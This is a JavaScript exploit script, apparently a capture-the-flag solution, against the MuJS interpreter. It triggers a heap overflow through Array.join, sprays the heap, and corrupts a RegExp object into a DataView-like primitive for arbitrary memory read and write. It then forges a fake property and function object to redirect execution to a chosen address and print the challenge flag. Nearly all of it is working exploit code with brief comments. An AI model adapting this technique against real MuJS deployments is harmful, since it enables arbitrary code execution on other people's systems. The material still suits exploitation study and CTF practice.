function u64(string){
  var num = 0;
  for(var i=7;i>=0;i--){
    num*=256;
    num+=string.charCodeAt(i);
  }
  return num;
}

function read32(addr,master,slave){
    //set slave data buffer to target address
    master.edit(0x128,addr%0x100000000);
    master.edit(0x12c,addr/0x100000000);
    //read from slave data buffer
    return slave.getUint32(0);
}

function write32(addr,value,master,slave){
    //set slave data buffer to target address
    master.edit(0x128,addr%0x100000000);
    master.edit(0x12c,addr/0x100000000);
    //write to slave data buffer
    slave.setUint32(0,value);
}

function write64(addr,value,master,slave){
    write32(addr,value%0x100000000,master,slave);
    write32(addr+4,value/0x100000000,master,slave);
}

function execute(addr,master,slave){
    //Store slave original properties
    var original_property = master.show(0x108)+master.show(0x10c)*0x100000000;
    //Use data of master as fake structure crafting ground
    var target_property = master.show(0xa8)+master.show(0xac)*0x100000000;
    //Craft fake Property
    write64(target_property,target_property+0x10,master,slave);
    write64(target_property+0x10,u64("trigger\x00"),master,slave);
    write64(target_property+0x30,target_property+0x40,master,slave);
    //Craft fake function object
    write32(target_property+0x40,0x5,master,slave);
    write64(target_property+0x68,addr,master,slave);
    write64(target_property+0x78,0,master,slave);
    //Overwrite slave properties to fake one
    master.edit(0x108,target_property%0x100000000);
    master.edit(0x10c,target_property/0x100000000);
    //trigger getter
    slave.trigger;
    //Restore slave original properties
    master.edit(0x108,original_property%0x100000000);
    master.edit(0x10c,original_property/0x100000000);
}

function main(){
    //Taking advantage of MuJS storing arrays items as individual properties and set index==strlen
    var STRING=[];
    var cnt = 1;
    STRING[cnt] = "P";
    for(var i=0;i<16;i++){
        STRING[cnt*2] = STRING[cnt]+STRING[cnt];
        cnt*=2;
    }

    //prepare array to join and trigger overflow
    var overflower = [STRING[0x10000].slice(0x81+1),
                      STRING[0x40]+STRING[0x80]+"\x11"];

    //From this point on, we need to be careful with heap layout
    //Spay chunks onto 0x80 zone to fill those dangling chunks, so that we will have a contiguous heap to work on
    var spray=[];
    for(var i=0;i<1000;i++){
        spray.push(STRING[0x40]);
    }

    //Create slave, master in correct order
    var slave = DataView(8);
    var master = RegExp(STRING[0x40]);

    //trigger overflow and overwrite master.type
    overflower.join("");

    //Layout sensitive objects are all put in place, we don't need to care about heap layout anymore
    master.edit = DataView.prototype.setUint32;
    master.show = DataView.prototype.getUint32;

    //Show address for debug purpose
    //debug(slave);
    //debug(master);

    //Save slave buffer address for restore
    var original_slave_buffer = master.show(0x128)+master.show(0x12c)*0x100000000;

    //Do the necessities
    write32(Challenge.write(),read32(Challenge.read(),master,slave),master,slave);
    execute(Challenge.exec(),master,slave);
    print(Challenge.getFlag());

    //Restore slave buffer address so process doesn't crash upon cleanup, and allow process to end gracefully
    master.edit(0x128,original_slave_buffer%0x100000000);
    master.edit(0x12c,original_slave_buffer/0x100000000);
}

main();
